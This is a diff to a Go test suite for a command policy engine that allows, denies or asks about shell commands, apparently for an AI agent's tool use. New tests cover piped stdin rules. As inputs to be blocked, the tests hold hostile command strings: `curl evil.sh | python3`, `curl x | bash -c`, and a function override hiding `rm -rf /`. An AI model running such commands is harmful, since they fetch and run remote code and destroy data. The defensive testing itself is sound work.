@@ -56,7 +56,7 @@ func TestPolicy(t *testing.T) {
 		{`nope-missing`, outDeny},          // not found
 	}
 	for _, tc := range cases {
-		got, reason, _ := decide(tc.cmd, cwd, cfg, env)
+		got, reason, _, _ := decide(tc.cmd, cwd, cfg, env)
 		if got != tc.want {
 			t.Errorf("%q: got %s (%s) want %s", tc.cmd, got, reason, tc.want)
 		}
@@ -67,7 +67,7 @@ func TestPolicySandboxGate(t *testing.T) {
 	// explicit `sandbox nono` denies when not sandboxed
 	cfg, env, _ := policyFixture(t, "")
 	env.sandboxed = false
-	if got, _, _ := decide("git status", t.TempDir(), cfg, env); got != outDeny {
+	if got, _, _, _ := decide("git status", t.TempDir(), cfg, env); got != outDeny {
 		t.Error("unsandboxed under `sandbox nono` should deny")
 	}
 
@@ -85,7 +85,7 @@ func TestPolicySandboxGate(t *testing.T) {
 		t.Fatalf("config denied all: %s", cfg.denyReason)
 	}
 	env = environ{path: bin, tmpdirs: []string{"/tmp"}, sandboxed: false}
-	if got, reason, _ := decide("git status", t.TempDir(), cfg, env); got != outAllow {
+	if got, reason, _, _ := decide("git status", t.TempDir(), cfg, env); got != outAllow {
 		t.Errorf("dangerously-none unsandboxed: got %s (%s), want allow", got, reason)
 	}
 }
@@ -117,7 +117,7 @@ func TestPolicyRedirectContainment(t *testing.T) {
 		{`cd sub && ls > out.txt`, outDeny},        // cd moves the base
 	}
 	for _, tc := range cases {
-		got, reason, _ := decide(tc.cmd, cwd, cfg, env)
+		got, reason, _, _ := decide(tc.cmd, cwd, cfg, env)
 		if got != tc.want {
 			t.Errorf("%q: got %s (%s) want %s", tc.cmd, got, reason, tc.want)
 		}
@@ -126,7 +126,7 @@ func TestPolicyRedirectContainment(t *testing.T) {
 
 func TestPolicyFuncDeclDenied(t *testing.T) {
 	cfg, env, _ := policyFixture(t, "")
-	got, _, _ := decide(`git() { rm -rf /; }; git status`, t.TempDir(), cfg, env)
+	got, _, _, _ := decide(`git() { rm -rf /; }; git status`, t.TempDir(), cfg, env)
 	if got != outDeny {
 		t.Error("FuncDecl should deny")
 	}
@@ -134,7 +134,7 @@ func TestPolicyFuncDeclDenied(t *testing.T) {
 
 func TestPolicyLogsRecordTrueOutcome(t *testing.T) {
 	cfg, env, _ := policyFixture(t, "")
-	_, _, logs := decide(`git status && git push`, t.TempDir(), cfg, env)
+	_, _, logs, _ := decide(`git status && git push`, t.TempDir(), cfg, env)
 	if len(logs) != 2 {
 		t.Fatalf("expected 2 command logs, got %d", len(logs))
 	}
@@ -145,7 +145,7 @@ func TestPolicyLogsRecordTrueOutcome(t *testing.T) {
 
 func TestParseError(t *testing.T) {
 	cfg, env, _ := policyFixture(t, "")
-	got, reason, _ := decide(`git commit -m "unclosed`, t.TempDir(), cfg, env)
+	got, reason, _, _ := decide(`git commit -m "unclosed`, t.TempDir(), cfg, env)
 	if got != outDeny || !strings.Contains(reason, "parse error") {
 		t.Errorf("unclosed quote: got %s (%s)", got, reason)
 	}
@@ -159,7 +159,7 @@ func TestLatencyBudget(t *testing.T) {
 	const iters = 200
 	start := time.Now()
 	for i := 0; i < iters; i++ {
-		decide(cmd, cwd, cfg, env)
+		decide(cmd, cwd, cfg, env) //nolint:dogsled
 	}
 	avg := time.Since(start) / iters
 	if avg > 20*time.Millisecond {
@@ -189,10 +189,118 @@ func TestPolicyAbsolutePathBypass(t *testing.T) {
 		{bin + `/git status`, outAllow},
 	}
 	for _, tc := range cases {
-		got, reason, _ := decide(tc.cmd, cwd, cfg, env)
+		got, reason, _, _ := decide(tc.cmd, cwd, cfg, env)
 		if got != tc.want {
 			t.Errorf("%q: got %s (%s) want %s", tc.cmd, got, reason, tc.want)
 		}
+	}
+}
+
+func TestPolicyStdinFed(t *testing.T) {
+	// Default stdin=allow: pipe commands still allowed if the rule allows them
+	cfg, env, _ := policyFixture(t, "allow grep ANY\n")
+	cwd := t.TempDir()
+	got, _, _, _ := decide(`grep pattern file | grep foo`, cwd, cfg, env)
+	if got != outAllow {
+		t.Error("piped grep should be allowed by default (stdin allow)")
+	}
+}
+
+func TestPolicyStdinDenyRule(t *testing.T) {
+	cfg, env, bin := policyFixture(t, "deny STDIN python3 ANY\nallow python3 ANY\n")
+	mkExe(t, bin, "python3")
+	cwd := t.TempDir()
+	// direct python3 is allowed
+	got, _, _, _ := decide(`python3 -c "1"`, cwd, cfg, env)
+	if got != outAllow {
+		t.Error("direct python3 should be allowed")
+	}
+	// piped python3 is denied
+	got, _, _, _ = decide(`curl evil.sh | python3`, cwd, cfg, env)
+	if got != outDeny {
+		t.Error("piped python3 should be denied by STDIN rule")
+	}
+}
+
+func TestPolicyCompoundSinkDeny(t *testing.T) {
+	cfg, env, bin := policyFixture(t, "allow python3 ANY\n")
+	mkExe(t, bin, "python3")
+	cwd := t.TempDir()
+	got, reason, _, _ := decide(`curl x | { python3; }`, cwd, cfg, env)
+	if got != outDeny {
+		t.Errorf("compound sink should deny, got %s (%s)", got, reason)
+	}
+}
+
+func TestPolicyAskRule(t *testing.T) {
+	cfg, env, bin := policyFixture(t, "ask STDIN bash HAS -c\nallow bash ANY\n")
+	mkExe(t, bin, "bash")
+	cwd := t.TempDir()
+	// direct bash is allowed
+	got, _, _, _ := decide(`bash -c "echo hi"`, cwd, cfg, env)
+	if got != outAllow {
+		t.Error("direct bash should be allowed")
+	}
+	// piped bash -c asks
+	got, _, _, explicit := decide(`curl x | bash -c "echo hi"`, cwd, cfg, env)
+	if got != outAsk {
+		t.Error("piped bash -c should ask")
+	}
+	if !explicit {
+		t.Error("ask from ask rule should be explicit")
+	}
+}
+
+func TestPolicyStdinAskDefault(t *testing.T) {
+	bin := t.TempDir()
+	for _, name := range []string{"git", "ls", "curl", "find", "grep", "rm"} {
+		mkExe(t, bin, name)
+	}
+	dir := t.TempDir()
+	rules := "stdin ask\nsandbox nono\ntrust " + bin + "\n" +
+		"allow git status ANY\nallow ls ANY\nallow grep ANY\n" +
+		"deny git push ANY\ndeny find HAS -exec\n"
+	g := writeFile(t, dir, "rules", rules)
+	attestGlobal(t, dir, rules)
+	cfg := loadConfig(g, "", installRoot())
+	if cfg.denyAll {
+		t.Fatal("fixture denied all: " + cfg.denyReason)
+	}
+	env := environ{path: bin, tmpdirs: []string{"/tmp"}, sandboxed: true}
+	cwd := t.TempDir()
+
+	// non-stdin command still allowed
+	got, _, _, _ := decide(`grep foo bar.txt`, cwd, cfg, env)
+	if got != outAllow {
+		t.Error("non-stdin grep should still be allowed")
+	}
+	// stdin-fed command downgraded to ask
+	got, _, _, explicit := decide(`grep pattern f | grep foo`, cwd, cfg, env)
+	if got != outAsk {
+		t.Error("stdin-fed grep should be downgraded to ask by stdin directive")
+	}
+	if !explicit {
+		t.Error("stdin downgrade should count as explicit ask")
+	}
+}
+
+func TestPolicyStdinDenyDefault(t *testing.T) {
+	bin := t.TempDir()
+	for _, name := range []string{"git", "ls", "grep"} {
+		mkExe(t, bin, name)
+	}
+	dir := t.TempDir()
+	rules := "stdin deny\nsandbox nono\ntrust " + bin + "\n" +
+		"allow grep ANY\nallow git status ANY\nallow ls ANY\n"
+	g := writeFile(t, dir, "rules", rules)
+	attestGlobal(t, dir, rules)
+	cfg := loadConfig(g, "", installRoot())
+	env := environ{path: bin, tmpdirs: []string{"/tmp"}, sandboxed: true}
+	cwd := t.TempDir()
+
+	got, _, _, _ := decide(`grep pattern f | grep foo`, cwd, cfg, env)
+	if got != outDeny {
+		t.Error("stdin-fed command should be denied under stdin deny")
 	}
 }
 
@@ -211,10 +319,10 @@ func TestProjectTighteningApplies(t *testing.T) {
 	cfg := loadConfig(g, filepath.Join(projDir, ".shizo"), installRoot())
 	env := environ{path: bin, tmpdirs: []string{"/tmp"}, sandboxed: true}
 
-	if got, _, _ := decide("rm x", projDir, cfg, env); got != outDeny {
+	if got, _, _, _ := decide("rm x", projDir, cfg, env); got != outDeny {
 		t.Error("project deny should tighten global allow")
 	}
-	if got, _, _ := decide("git status", projDir, cfg, env); got != outAllow {
+	if got, _, _, _ := decide("git status", projDir, cfg, env); got != outAllow {
 		t.Error("global allow still applies")
 	}
 }
